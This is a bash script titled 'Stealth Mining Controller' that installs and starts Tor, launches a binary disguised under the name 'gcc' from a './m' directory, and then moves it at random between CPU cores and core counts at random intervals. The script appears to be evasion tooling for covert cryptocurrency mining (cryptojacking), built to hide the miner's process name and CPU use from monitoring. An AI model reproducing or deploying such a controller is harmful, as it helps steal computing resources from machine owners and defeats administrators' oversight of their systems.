#!/usr/bin/env bash

set -u

# ------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------

# The binary inside the repo to run
BINARY_NAME="gcc" 
BINARY_PATH="./m/${BINARY_NAME}"

# Random delay between changes (seconds):
MIN_DELAY=1
MAX_DELAY=60

# ------------------------------------------------------------
# SETUP & CLEANUP
# ------------------------------------------------------------

echo "=========================================="
echo " Stealth Mining Controller"
echo "=========================================="

# 2. Update System & Install Tor
echo "[*] Updating system and installing Tor..."
sudo apt update -y
sudo apt install tor -y

# 3. Start Tor in the background
echo "[*] Starting Tor..."
(tor &)
# Wait briefly for Tor to initialize
sleep 2

# 5. Make executable and verify
if [ ! -x "${BINARY_PATH}" ]; then
    chmod +x "${BINARY_PATH}"
fi

if [ ! -x "${BINARY_PATH}" ]; then
    echo "Error: ${BINARY_PATH} is not executable or missing."
    exit 1
fi

# ------------------------------------------------------------
# AUTO-DETECT CPU CORES
# ------------------------------------------------------------

CPU_COUNT=$(nproc)

# Dynamic Configuration:
# Set MAX_CPUS to 75% of total cores
# Ensure at least 1 core is available for max
if (( CPU_COUNT >= 2 )); then
    MAX_CPUS=$(( CPU_COUNT * 75 / 100 ))
else
    MAX_CPUS=1
fi

MIN_CPUS=1

echo "[*] System has ${CPU_COUNT} Thread(s)."
echo "[*] Stealth Mode: Using 1 to ${MAX_CPUS} Thread(s) randomly."

# ------------------------------------------------------------
# LAUNCH PROCESS
# ------------------------------------------------------------

echo "[*] Launching ${BINARY_NAME}..."
"${BINARY_PATH}" &
LAUNCH_PID=$!

# Give it a moment to start
sleep 1

# Verify it's running
if ! kill -0 "${LAUNCH_PID}" 2>/dev/null; then
    echo "Error: ${BINARY_NAME} exited immediately."
    exit 1
fi

echo "Process launched with PID: ${LAUNCH_PID}"

echo "Controller started."
echo "Press Ctrl+C to stop."
echo

# ------------------------------------------------------------
# RESTORE CPU AFFINITY
# ------------------------------------------------------------

restore() {
    echo
    echo "Restoring CPU affinity for PID ${LAUNCH_PID}..."
    
    LAST_CPU=$((CPU_COUNT - 1))
    
    # Set all CPUs back to 0..N
    taskset -apc "0-${LAST_CPU}" "${LAUNCH_PID}" >/dev/null 2>&1 || true
    
    echo "Done."
}

trap restore EXIT INT TERM

# ------------------------------------------------------------
# RANDOM CPU CONTROL LOOP
# ------------------------------------------------------------

while kill -0 "${LAUNCH_PID}" 2>/dev/null; do

    # 1. Randomly select number of CPUs to use
    CPUS=$(shuf -i "${MIN_CPUS}-${MAX_CPUS}" -n 1)

    # 2. Randomly select WHICH CPUs to use
    # Generate a list of CPUS unique core numbers from 0 to CPU_COUNT-1
    # Example: If CPUS=2 and CPU_COUNT=4, this might pick cores 1 and 3
    CPU_LIST=$(shuf -i "0-$((CPU_COUNT - 1))" -n "${CPUS}" | sort -n | tr '\n' ',' | sed 's/,$//')

    # Apply affinity to the process.
    # We use -p to target the process and its threads if they are bound to it.
    if taskset -apc "${CPU_LIST}" "${LAUNCH_PID}" >/dev/null 2>&1; then

        # Random delay before the next CPU change.
        DELAY=$(
            shuf -i "${MIN_DELAY}-${MAX_DELAY}" -n 1
        )

        printf '[%s] CPUs: %d/%d | Thread(s): [%s] | Next change: %ds\n' \
            "$(date '+%H:%M:%S')" \
            "$CPUS" \
            "$CPU_COUNT" \
            "${CPU_LIST}" \
            "$DELAY"

    else
        echo "Failed to change CPU affinity for PID ${LAUNCH_PID}."
        break
    fi

    sleep "${DELAY}"
done
